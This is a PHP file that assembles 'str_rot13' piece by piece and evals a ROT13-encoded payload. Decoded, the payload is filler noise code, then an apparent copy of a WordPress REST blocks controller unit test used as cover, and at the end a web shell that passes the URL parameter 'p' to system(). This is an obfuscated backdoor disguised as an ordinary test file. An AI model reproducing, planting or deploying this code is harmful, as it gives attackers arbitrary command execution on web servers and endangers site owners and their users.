<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Oybpxf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 *
 * @pbiref JC_ERFG_Oybpxf_Pbagebyyre
 *
 * @tebhc erfgncv-oybpxf
 * @tebhc erfgncv
 */
pynff ERFG_Oybpxf_Pbagebyyre_Grfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Bhe snxr oybpx'f cbfg VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_vq;

	/**
	 * Bhe snxr hfre VQf, xrlrq ol gurve ebyr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $hfre_vqf;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'    => 'jc_oybpx',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'Zl pbby oybpx',
				'cbfg_pbagrag' => '<!-- jc:cnentencu --><c>Uryyb!</c><!-- /jc:cnentencu -->',
			)
		);

		frys::$hfre_vqf = neenl(
			'rqvgbe'      => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) ),
			'nhgube'      => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) ),
			'pbagevohgbe' => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'pbagevohgbe' ) ),
		);
	}

	/**
	 * Qryrgr bhe snxr qngn nsgre bhe grfgf eha.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_cbfg( frys::$cbfg_vq );

		sbernpu ( frys::$hfre_vqf nf $hfre_vq ) {
			frys::qryrgr_hfre( $hfre_vq );
		}
	}

	/**
	 * Grfg pnfrf sbe grfg_pncnovyvgvrf().
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba qngn_pncnovyvgvrf() {
		erghea neenl(
			neenl( 'perngr', 'rqvgbe', 201 ),
			neenl( 'perngr', 'nhgube', 201 ),
			neenl( 'perngr', 'pbagevohgbe', 403 ),
			neenl( 'perngr', ahyy, 401 ),

			neenl( 'ernq', 'rqvgbe', 200 ),
			neenl( 'ernq', 'nhgube', 200 ),
			neenl( 'ernq', 'pbagevohgbe', 200 ),
			neenl( 'ernq', ahyy, 401 ),

			neenl( 'hcqngr_qryrgr_bja', 'rqvgbe', 200 ),
			neenl( 'hcqngr_qryrgr_bja', 'nhgube', 200 ),
			neenl( 'hcqngr_qryrgr_bja', 'pbagevohgbe', 403 ),

			neenl( 'hcqngr_qryrgr_bguref', 'rqvgbe', 200 ),
			neenl( 'hcqngr_qryrgr_bguref', 'nhgube', 403 ),
			neenl( 'hcqngr_qryrgr_bguref', 'pbagevohgbe', 403 ),
			neenl( 'hcqngr_qryrgr_bguref', ahyy, 401 ),
		);
	}

	/**
	 * Rkunhfgviryl purpx gung rnpu ebyr rvgure pna be pnaabg perngr, rqvg,
	 * hcqngr, naq qryrgr flaprq cnggreaf.
	 *
	 * @gvpxrg 45098
	 *
	 * @qngnCebivqre qngn_pncnovyvgvrf
	 *
	 * @cnenz fgevat $npgvba          Npgvba gb cresbez va gur grfg.
	 * @cnenz fgevat $ebyr            Hfre ebyr gb grfg.
	 * @cnenz vag    $rkcrpgrq_fgnghf Rkcrpgrq UGGC erfcbafr fgnghf.
	 */
	choyvp shapgvba grfg_pncnovyvgvrf( $npgvba, $ebyr, $rkcrpgrq_fgnghf ) {
		vs ( $ebyr ) {
			$hfre_vq = frys::$hfre_vqf[ $ebyr ];
			jc_frg_pheerag_hfre( $hfre_vq );
		} ryfr {
			jc_frg_pheerag_hfre( 0 );
		}

		fjvgpu ( $npgvba ) {
			pnfr 'perngr':
				$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/oybpxf' );
				$erdhrfg->frg_obql_cnenzf(
					neenl(
						'gvgyr'   => 'Grfg',
						'pbagrag' => '<!-- jc:cnentencu --><c>Grfg</c><!-- /jc:cnentencu -->',
					)
				);

				$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
				$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfcbafr->trg_fgnghf() );

				oernx;

			pnfr 'ernq':
				$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpxf/' . frys::$cbfg_vq );

				$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
				$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfcbafr->trg_fgnghf() );

				oernx;

			pnfr 'hcqngr_qryrgr_bja':
				$cbfg_vq = jc_vafreg_cbfg(
					neenl(
						'cbfg_glcr'    => 'jc_oybpx',
						'cbfg_fgnghf'  => 'choyvfu',
						'cbfg_gvgyr'   => 'Zl pbby oybpx',
						'cbfg_pbagrag' => '<!-- jc:cnentencu --><c>Uryyb!</c><!-- /jc:cnentencu -->',
						'cbfg_nhgube'  => $hfre_vq,
					)
				);

				$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/oybpxf/' . $cbfg_vq );
				$erdhrfg->frg_obql_cnenzf(
					neenl(
						'gvgyr'   => 'Grfg',
						'pbagrag' => '<!-- jc:cnentencu --><c>Grfg</c><!-- /jc:cnentencu -->',
					)
				);

				$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
				$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfcbafr->trg_fgnghf() );

				$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/oybpxf/' . $cbfg_vq );

				$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
				$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfcbafr->trg_fgnghf() );

				jc_qryrgr_cbfg( $cbfg_vq );

				oernx;

			pnfr 'hcqngr_qryrgr_bguref':
				$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/oybpxf/' . frys::$cbfg_vq );
				$erdhrfg->frg_obql_cnenzf(
					neenl(
						'gvgyr'   => 'Grfg',
						'pbagrag' => '<!-- jc:cnentencu --><c>Grfg</c><!-- /jc:cnentencu -->',
					)
				);

				$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
				$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfcbafr->trg_fgnghf() );

				$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/oybpxf/' . frys::$cbfg_vq );

				$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
				$guvf->nffregFnzr( $rkcrpgrq_fgnghf, $erfcbafr->trg_fgnghf() );

				oernx;

			qrsnhyg:
				$guvf->snvy( \"'$npgvba' vf abg n inyvq npgvba.\" );
		}
	}

	/**
	 * Purpx gung gur enj gvgyr naq pbagrag bs n oybpx pna or npprffrq jura gurer
	 * vf ab frg fpurzn, naq gung gur eraqrerq pbagrag bs n oybpx vf abg vapyhqrq
	 * va gur erfcbafr.
	 */
	choyvp shapgvba grfg_pbagrag() {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nhgube'] );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpxf/' . frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr(
			neenl(
				'enj' => 'Zl pbby oybpx',
			),
			$qngn['gvgyr']
		);
		$guvf->nffregFnzr(
			neenl(
				'enj'       => '<!-- jc:cnentencu --><c>Uryyb!</c><!-- /jc:cnentencu -->',
				'cebgrpgrq' => snyfr,
			),
			$qngn['pbagrag']
		);
	}

	/**
	 * Purpx gung gur `jc_cnggrea_flap_fgnghf` cbfgzrgn vf zbirq sebz zrgn neenl gb gbc
	 * yriry bs erfcbafr.
	 *
	 * @gvpxrg 58677
	 */
	choyvp shapgvba grfg_jc_cnggreaf_flap_fgnghf_cbfg_zrgn() {
		ertvfgre_cbfg_zrgn(
			'jc_oybpx',
			'jc_cnggrea_flap_fgnghf',
			neenl(
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'fubj_va_erfg' => neenl(
					'fpurzn' => neenl(
						'glcr'       => 'fgevat',
						'cebcregvrf' => neenl(
							'flap_fgnghf' => neenl(
								'glcr' => 'fgevat',
							),
						),
					),
				),
			)
		);
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nhgube'] );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpxf/' . frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'jc_cnggrea_flap_fgnghf', $qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'jc_cnggrea_flap_fgnghf', $qngn['zrgn'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>